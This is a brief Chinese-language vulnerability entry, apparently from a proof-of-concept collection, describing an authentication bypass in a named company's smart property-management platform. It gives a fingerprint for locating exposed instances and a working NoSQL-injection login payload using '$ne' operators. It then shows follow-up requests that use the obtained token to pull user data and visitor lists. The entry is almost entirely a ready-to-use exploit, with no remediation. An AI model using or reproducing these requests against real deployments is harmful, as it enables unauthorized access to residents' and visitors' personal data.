# 青岛住云创智科技有限公司智慧物业服务平台login存在身份认证绕过漏洞

青岛住云创智科技有限公司智慧物业服务平台 ｜ 认证/授权绕过 ｜ —
- **指纹**：`title="智慧物业"`
- **请求**：`POST /api/login HTTP/1.1`

**Payload**
```
获取Token
Host:
Content-Type: application/json
{"username":{"$ne":""},"password":{"$ne":""}}
GET /api/user HTTP/1.1
Host:
token:第一个请求的token填入
GET /api/door/visitor/list
Host:
token:第一个请求的token填入
```
- **响应特征**：200 data